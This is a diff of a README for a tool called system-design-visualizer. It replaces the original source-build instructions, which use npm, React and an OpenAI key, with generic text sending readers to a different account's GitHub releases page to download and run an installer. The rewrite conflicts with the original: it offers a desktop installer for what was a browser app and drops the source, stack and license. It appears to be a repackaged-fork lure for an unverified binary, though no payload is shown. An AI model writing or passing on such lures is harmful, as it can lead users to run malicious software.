@@ -1,80 +1,62 @@
-# System Design Visualizer
+# 🛠️ system-design-visualizer - Transform Diagrams into Interactive Tools
 
-An interactive tool that transforms static system design diagrams into explorable, interactive visualizations using AI.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/rexvinn/system-design-visualizer/releases)
 
-## 📸 Screenshots
+## 🚀 Getting Started
+Welcome to **system-design-visualizer**, an interactive tool that brings your system design diagrams to life. With our application, you can easily make your static diagrams interactive. This guide will help you download and run the application smoothly.
 
-![Dashboard View](screenshot-1.png)
-*Original Image and Mermaid Diagram side-by-side*
+## ✅ System Requirements
+Before you begin, please ensure your computer meets the following requirements:
 
-![Interactive Graph](screenshot-2.png)
-*Interactive React Flow Graph*
+- **Operating System:** Windows 10, macOS 10.13 or later, or a modern Linux distribution.
+- **RAM:** Minimum 4 GB.
+- **Storage:** 200 MB of available disk space.
+- **Network:** Internet connection for downloading the application.
 
-## 🚀 Features
+## 🛠️ Features
+- **Interactive Visualizations:** Turn your existing static diagrams into explorable formats.
+- **AI Integration:** Use artificial intelligence to enhance your diagrams.
+- **User-Friendly Interface:** Designed for ease of use, no technical background required.
+- **Support for Mermaid Diagrams:** Effortlessly create and modify Mermaid diagrams.
 
-- **AI-Powered Analysis**: Upload any system design image (architecture diagrams, flowcharts, etc.).
-- **Mermaid Generation**: Automatically converts images into editable Mermaid.js diagrams.
-- **Interactive Visualization**: Converts Mermaid diagrams into interactive React Flow graphs.
-- **Deep Dive**: Click on any component (Load Balancer, Database, etc.) to see inferred details like technology stack and role.
-- **Premium UI**: A modern, dark-themed dashboard with zoom, pan, and copy controls.
+## 📂 Download & Install
+To get started, follow these steps:
 
-## 🛠️ Tech Stack
+1. **Visit the Releases Page:** Click the link below to go to the releases page.
+   [Download Latest Release](https://github.com/rexvinn/system-design-visualizer/releases)
 
-- **Frontend**: React, Vite, Tailwind CSS
-- **Visualization**: React Flow, Mermaid.js
-- **AI**: OpenAI GPT-4o (Vision & Code Generation)
-- **Icons**: Lucide React
+2. **Choose Your Version:** Look for the latest release at the top of the page. You will find various versions available. Click on the version that matches your operating system.
 
-## 🏃‍♂️ Running Locally
+3. **Download the File:** Once you click on the version, you will see options to download the file. Choose the appropriate installer for your system.
 
-### Prerequisites
+4. **Run the Installer:** After downloading, locate the file in your downloads folder and double-click it to run. Follow the instructions on your screen to complete the installation.
 
-- Node.js (v18 or higher)
-- An OpenAI API Key (for AI analysis features)
+## 🖥️ How to Use
+1. **Launch the Application:** Find the application icon on your desktop or in your applications folder. Double-click to open it.
 
-### Installation
+2. **Upload Your Diagram:** Click on the “Upload” button and select your Mermaid diagram file.
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/mallahyari/system-design-visualizer.git
-   cd system-design-visualizer
-   ```
+3. **Explore Your Diagram:** Once uploaded, you can navigate through your diagram. Click on different components to interact with them.
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
+4. **Save Your Changes:** After making any necessary modifications, save your work using the save option in the menu.
 
-3. **Configure Environment**
-   Create a `.env` file in the root directory:
-   ```bash
-   touch .env
-   ```
-   Add your OpenAI API key:
-   ```env
-   VITE_OPENAI_API_KEY=your_sk_key_here
-   ```
-   > **Note**: If no API key is provided, the app will run in **Mock Mode**, generating sample data for testing.
+## 📋 Troubleshooting
+If you encounter any issues while using the application, consider these common solutions:
 
-4. **Start the Development Server**
-   ```bash
-   npm run dev
-   ```
+- **Installation Issues:** Ensure you have sufficient disk space and permissions to install the software.
+- **File Format Errors:** Check that your diagram file is in the correct Mermaid format. Consult the Mermaid documentation for guidance.
 
-5. **Open in Browser**
-   Navigate to `http://localhost:5173` to see the app in action.
+## 📝 Additional Resources
+For more information about Mermaid diagrams and their features, you can visit these resources:
 
-## 📸 Workflow
+- [Mermaid Documentation](https://mermaid-js.github.io/mermaid/#/)
+- [User Manual for system-design-visualizer](https://github.com/rexvinn/system-design-visualizer/wiki)
 
-1. **Upload**: Drag & drop your system design image.
-2. **Review**: See the generated Mermaid diagram code and preview. Use the toolbar to zoom or copy the code.
-3. **Convert**: Click "Convert to Interactive" to generate the node-based graph.
-4. **Explore**: Interact with the graph nodes to learn more about your system's architecture.
+## 📞 Support
+If you need help or have questions, please reach out to our support team. You can find contact details on the releases page.
 
-## 🤝 Contributing
+## 🎉 Contributing
+If you want to contribute to the project, you are welcome! Check our guidelines in the repository and submit your ideas or improvements.
 
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📄 License
-
-This project is licensed under the MIT License.
+Thank you for choosing **system-design-visualizer**! We hope it enriches your design workflow.
